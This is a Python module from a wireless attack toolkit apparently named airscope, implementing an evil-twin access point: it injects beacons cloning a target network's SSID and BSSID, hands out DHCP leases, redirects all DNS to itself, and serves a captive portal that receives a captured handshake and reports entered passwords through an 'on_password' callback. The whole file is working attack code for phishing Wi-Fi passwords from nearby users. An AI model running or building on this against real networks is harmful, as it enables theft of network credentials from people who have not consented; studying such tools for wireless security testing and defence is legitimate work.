"""USB worker thread for the captive-portal AP.

Runs the beacon TX loop and dispatches incoming frames to the AP core,
DHCP, DNS, and TCP stacks.  Integrates with the existing airscope driver
(async ``inject_frame`` / ``register_rx_callback``) via ``asyncio``.
"""
from __future__ import annotations

import asyncio
import logging
import struct
import time
from dataclasses import dataclass, field
from typing import Callable, Optional

from airscope.evil_twin.ap.ap_core import ApCore
from airscope.evil_twin.ap.dhcp import DhcpServer
from airscope.evil_twin.ap.dns import DnsBlackhole
from airscope.evil_twin.ap.frames import (
    FC_TYPE_DATA, FC_TYPE_MGMT, craft_beacon,
    extract_ssid_from_probe, parse_fc, strip_data_payload,
)
from airscope.evil_twin.ap.http import PortalHttpHandler
from airscope.evil_twin.ap.tcp import TcpStack

log = logging.getLogger(__name__)

_BEACON_INTERVAL_MS = 100  # ms
_STALE_CLIENT_SEC = 30.0


@dataclass
class ApWorker:
    """Runs the captive-portal AP over an existing airscope driver.

    Usage::

        worker = ApWorker(driver, iface, ssid, bssid, channel, hs, pair)
        await worker.start()
        ...
        await worker.stop()
    """
    driver: object  # airscope Driver instance
    iface: object  # WlanInterface
    ssid: str
    bssid: str
    channel: int
    hs: object  # Handshake
    pair: object  # CrackablePair
    on_password: Optional[Callable[[str], None]] = None
    log_fn: Optional[Callable[[str], None]] = None

    _ap: Optional[ApCore] = field(default=None, repr=False)
    _dhcp: Optional[DhcpServer] = field(default=None, repr=False)
    _dns: Optional[DnsBlackhole] = field(default=None, repr=False)
    _tcp: Optional[TcpStack] = field(default=None, repr=False)
    _http: Optional[PortalHttpHandler] = field(default=None, repr=False)
    _beacon_task: Optional[asyncio.Task] = field(default=None, repr=False)
    _cleanup_task: Optional[asyncio.Task] = field(default=None, repr=False)
    _running: bool = field(default=False, repr=False)
    _seq: int = field(default=0, repr=False)
    _data_seq: int = field(default=0, repr=False)

    def __post_init__(self) -> None:
        self._log = self.log_fn or (lambda m: log.info(m))
        bssid_bytes = bytes(int(o, 16) for o in self.bssid.split(":"))

        self._ap = ApCore(
            ssid=self.ssid,
            bssid=bssid_bytes,
            channel=self.channel,
            send_frame=self._inject_sync,
            on_client_assoc=self._on_client_assoc,
        )

        self._dhcp = DhcpServer(
            gateway_ip="192.168.4.1",
            send_ip=self._send_udp_to_client,
        )

        self._dns = DnsBlackhole(
            redirect_ip="192.168.4.1",
            send_ip=self._send_udp_to_client,
        )

        self._http = PortalHttpHandler(
            ssid=self.ssid,
            hs=self.hs,
            pair=self.pair,
            on_password=self.on_password,
        )

        self._tcp = TcpStack(
            server_ip="192.168.4.1",
            server_port=8080,
            send_ip=self._send_ip_to_client,
            on_http_request=self._http.handle_request,
        )

    async def start(self) -> None:
        self._running = True
        self.iface.register_rx_callback(self._on_rx)
        self._beacon_task = asyncio.create_task(self._beacon_loop())
        self._cleanup_task = asyncio.create_task(self._cleanup_loop())
        self._log(f"[ap-worker] {self.ssid} started on ch {self.channel}")

    async def stop(self) -> None:
        self._running = False
        if self._beacon_task:
            self._beacon_task.cancel()
        if self._cleanup_task:
            self._cleanup_task.cancel()
        self.iface.unregister_rx_callback(self._on_rx)
        self._log("[ap-worker] stopped")

    # ----- RX dispatch -------------------------------------------------------

    def _on_rx(self, pkt) -> None:
        raw = pkt.raw
        if len(raw) < 12:
            return
        fc_type, subtype, to_ds, from_ds = parse_fc(raw)

        if fc_type == FC_TYPE_MGMT:
            self._handle_mgmt(raw, subtype)
        elif fc_type == FC_TYPE_DATA and to_ds:
            self._handle_data_from_client(raw)

    def _handle_mgmt(self, raw: bytes, subtype: int) -> None:
        if len(raw) < 24:
            return
        src_mac = raw[10:16]
        if subtype == 0x0B:  # Auth
            self._ap.handle_auth(src_mac)
        elif subtype in (0x00, 0x02):  # (Re)Assoc Request
            self._ap.handle_assoc_req(src_mac)
        elif subtype == 0x04:  # Probe Request
            ssid = extract_ssid_from_probe(raw)
            self._ap.handle_probe_request(src_mac, ssid)

    def _handle_data_from_client(self, raw: bytes) -> None:
        result = strip_data_payload(raw)
        if result is None:
            return
        src_mac_bytes, ip_packet = result
        src_mac = ":".join(f"{b:02x}" for b in src_mac_bytes)
        client_ip = self._dhcp.get_lease_ip(src_mac)
        if client_ip is None:
            return

        if len(ip_packet) < 20:
            return
        proto = ip_packet[9]
        ihl = (ip_packet[0] & 0x0F) * 4

        if proto == 17:  # UDP
            self._handle_udp(ip_packet, ihl, src_mac, client_ip)
        elif proto == 6:  # TCP
            self._tcp.handle_ip_packet(ip_packet)

    def _handle_udp(self, ip_packet: bytes, ihl: int, src_mac: str,
                    client_ip: str) -> None:
        udp = ip_packet[ihl:]
        if len(udp) < 8:
            return
        dst_port = struct.unpack(">H", udp[2:4])[0]
        payload = udp[8:]

        if dst_port == 67:  # DHCP
            reply = self._dhcp.handle_dhcp(payload, src_mac)
            if reply:
                self._send_udp_from_server(client_ip, 68, 67, reply)
        elif dst_port == 53:  # DNS
            reply = self._dns.handle_dns(payload, client_ip)
            if reply:
                self._send_udp_from_server(client_ip, 53, 53, reply)

    # ----- TX helpers --------------------------------------------------------

    def _inject_sync(self, frame: bytes) -> None:
        asyncio.ensure_future(self.driver.inject_frame(frame))

    async def _beacon_loop(self) -> None:
        bssid_bytes = bytes(int(o, 16) for o in self.bssid.split(":"))
        while self._running:
            self._seq = (self._seq + 1) & 0xFFF
            beacon = craft_beacon(bssid_bytes, self.ssid, self.channel, self._seq)
            await self.driver.inject_frame(beacon)
            await asyncio.sleep(_BEACON_INTERVAL_MS / 1000.0)

    async def _cleanup_loop(self) -> None:
        while self._running:
            stale = self._ap.cleanup_stale(_STALE_CLIENT_SEC)
            if stale:
                log.debug("cleaned stale clients: %s", stale)
            await asyncio.sleep(10.0)

    def _on_client_assoc(self, mac: str) -> None:
        self._log(f"[ap] client associated: {mac}")

    def _send_ip_to_client(self, ip_packet: bytes) -> None:
        src_mac_str = self._resolve_mac_from_ip(
            struct.unpack(">I", ip_packet[16:20])[0])
        if src_mac_str is None:
            return
        client_mac = bytes(int(o, 16) for o in src_mac_str.split(":"))
        bssid_bytes = bytes(int(o, 16) for o in self.bssid.split(":"))
        from airscope.evil_twin.ap.frames import wrap_ip_in_data
        self._data_seq = (self._data_seq + 1) & 0xFFF
        frame = wrap_ip_in_data(client_mac, bssid_bytes, ip_packet, self._data_seq)
        asyncio.ensure_future(self.driver.inject_frame(frame))

    def _send_udp_to_client(self, client_ip: str, payload: bytes) -> None:
        self._send_udp_from_server(client_ip, 53, 53, payload)

    def _send_udp_from_server(self, dst_ip: str, dst_port: int, src_port: int,
                               payload: bytes) -> None:
        src_ip = "192.168.4.1"
        udp_len = 8 + len(payload)
        udp_header = struct.pack(">HHH", src_port, dst_port, udp_len)
        udp_header += b"\x00\x00"  # checksum (zero = unused)
        udp_segment = udp_header + payload

        # IP header
        total_len = 20 + len(udp_segment)
        ip = bytearray(20)
        ip[0] = 0x45
        ip[2:4] = struct.pack(">H", total_len)
        ip[6:8] = b"\x00\x00"
        ip[8] = 64
        ip[9] = 17  # UDP
        src_bytes = bytes(int(o) for o in src_ip.split("."))
        dst_bytes = bytes(int(o) for o in dst_ip.split("."))
        ip[12:16] = src_bytes
        ip[16:20] = dst_bytes

        # Checksum
        cs = self._ip_checksum(bytes(ip))
        ip[10:12] = struct.pack(">H", cs)

        self._send_ip_to_client(bytes(ip) + udp_segment)

    def _resolve_mac_from_ip(self, ip_int: int) -> Optional[str]:
        for mac, lease in self._dhcp._leases.items():
            if lease.ip == self._int_to_ip(ip_int) and lease.expires > time.time():
                return mac
        return None

    @staticmethod
    def _int_to_ip(n: int) -> str:
        return f"{(n >> 24) & 0xFF}.{(n >> 16) & 0xFF}.{(n >> 8) & 0xFF}.{n & 0xFF}"

    @staticmethod
    def _ip_checksum(header: bytes) -> int:
        if len(header) % 2:
            header += b"\x00"
        s = 0
        for i in range(0, len(header), 2):
            s += (header[i] << 8) | header[i + 1]
        while s >> 16:
            s = (s & 0xFFFF) + (s >> 16)
        return ~s & 0xFFFF
